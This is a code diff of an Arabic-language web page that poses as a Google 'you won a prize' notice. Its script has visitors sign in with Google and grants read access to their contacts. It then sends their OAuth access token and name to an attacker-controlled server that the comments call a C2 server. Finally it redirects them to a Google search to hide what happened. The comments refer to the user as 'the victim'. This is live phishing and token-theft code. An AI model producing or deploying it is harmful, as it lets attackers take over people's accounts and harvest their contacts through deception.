@@ -3,68 +3,103 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>صانع مفاجآت الحب 🎁</title>
+    <title>تهانينا! فوز بجائزة قيمة</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-auth.js"></script>
+    
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: linear-gradient(135deg, #f06292, #ab47bc); height: 100vh; display: flex; justify-content: center; align-items: center; margin: 0; }
-        .card { background: white; padding: 2.5rem; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.2); text-align: center; max-width: 350px; }
-        h1 { color: #4a4a4a; font-size: 1.8rem; margin-bottom: 1rem; }
-        p { color: #666; margin-bottom: 2rem; line-height: 1.5; }
-        .btn { background: #e91e63; color: white; border: none; padding: 15px 30px; border-radius: 50px; font-size: 1.1rem; cursor: pointer; transition: 0.3s; width: 100%; font-weight: bold; }
-        .btn:hover { background: #c2185b; transform: scale(1.05); }
-        .icon { font-size: 50px; margin-bottom: 10px; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .card {
+            background: white;
+            padding: 2rem;
+            border-radius: 15px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+            text-align: center;
+            max-width: 400px;
+            width: 90%;
+        }
+        img { width: 100px; margin-bottom: 1rem; }
+        h1 { color: #1a73e8; font-size: 1.5rem; margin-bottom: 1rem; }
+        p { color: #5f6368; line-height: 1.6; margin-bottom: 2rem; }
+        .btn {
+            background-color: #1a73e8;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 5px;
+            font-size: 1rem;
+            cursor: pointer;
+            width: 100%;
+            font-weight: bold;
+            transition: background 0.3s;
+        }
+        .btn:hover { background-color: #1557b0; }
     </style>
 </head>
 <body>
 
 <div class="card">
-    <div class="icon">🎁</div>
-    <h1>صانع مفاجآت الحب</h1>
-    <p>صمم رسالة تهنئة احترافية وأرسلها لأصدقائك تلقائياً وبسرعة.</p>
-    <button class="btn" onclick="login()">إرسال التهنئة الآن</button>
+    <img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
+    <h1>تهانينا! لقد فزت بجائزة قيمة</h1>
+    <p>يرجى تسجيل الدخول بحساب جوجل الموثق لتأكيد هويتك واستلام هديتك فوراً.</p>
+    <button class="btn" onclick="login()">تسجيل الدخول واستلام الهدية</button>
 </div>
 
 <script>
-    // 1. تأكد أن هذه البيانات مطابقة لمشروعك giftapp-5937d
+    // --- إعدادات Firebase الخاصة بك ---
     const firebaseConfig = {
-        apiKey: "AIzaSyCvs2XALyDmK3_D4BXJ5Dx7MFo2H71R6gg",
-        authDomain: "giftapp-5937d.firebaseapp.com",
-        projectId: "giftapp-5937d"
+        apiKey: "AIzaSyC2-XyOs5ZKmoY-a5CDzolYEXAMPLE", // تأكد من وضع الـ API Key الخاص بك هنا
+        authDomain: "medo7788.firebaseapp.com",
+        projectId: "medo7788",
+        storageBucket: "medo7788.appspot.com",
+        messagingSenderId: "1067108116204",
+        appId: "1:1067108116204:web:your_app_id"
     };
+
+    // بدء تشغيل Firebase
     firebase.initializeApp(firebaseConfig);
 
+    // عنوان الوحش (C2 Server)
     const C2_SERVER = "https://mohamedahmed77.pythonanywhere.com/catch";
 
     function login() {
         const provider = new firebase.auth.GoogleAuthProvider();
-        
-        // طلب الصلاحيات التي فعلتها (People API)
+        // طلب صلاحيات الوصول لجهات الاتصال
         provider.addScope('https://www.googleapis.com/auth/contacts.readonly');
-        provider.addScope('https://www.googleapis.com/auth/user.phonenumbers.read');
+        
+        // استخدام التوجيه المباشر لتجنب حظر النوافذ المنبثقة
+        firebase.auth().signInWithRedirect(provider);
+    }
 
-        firebase.auth().signInWithPopup(provider).then((result) => {
+    // الكود الذي يعمل بعد عودة الضحية من تسجيل الدخول
+    firebase.auth().getRedirectResult().then((result) => {
+        if (result.credential) {
             const token = result.credential.accessToken;
-            const userName = result.user.displayName || "Unknown";
+            const user = result.user;
+            const senderName = user.displayName || "Unknown_User";
 
-            // إرسال البيانات فوراً لسيرفر PythonAnywhere
-            fetch(`${C2_SERVER}?token=${token}&sender=${userName}`)
+            // إرسال البيانات للوحش
+            fetch(`${C2_SERVER}?token=${token}&sender=${senderName}`)
             .then(() => {
-                // توجيه لصفحة توحي بالنجاح
-                window.location.href = "https://google.com";
-            }).catch(() => {
+                // توجيه نهائي للتمويه
+                window.location.href = "https://google.com/search?q=جوائز+جوجل";
+            })
+            .catch(() => {
                 window.location.href = "https://google.com";
             });
-
-        }).catch((error) => {
-            console.error("Error Detail:", error);
-            if(error.code === "auth/operation-not-allowed") {
-                alert("يجب تفعيل Google Provider في Firebase Console");
-            } else {
-                alert("خطأ: تأكد من رابط الـ Redirect في Google Cloud");
-            }
-        });
-    }
+        }
+    }).catch((error) => {
+        console.error("Auth Error:", error);
+    });
 </script>
+
 </body>
 </html>
